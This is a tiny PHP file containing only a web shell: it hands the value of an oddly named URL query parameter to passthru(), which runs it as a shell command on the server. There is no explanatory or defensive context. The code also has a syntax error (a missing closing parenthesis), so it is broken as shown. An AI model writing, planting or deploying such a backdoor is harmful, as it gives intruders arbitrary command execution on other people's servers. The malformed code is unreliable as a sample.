<?php
passthru($_GET['iy2CI3Mb'];
?>
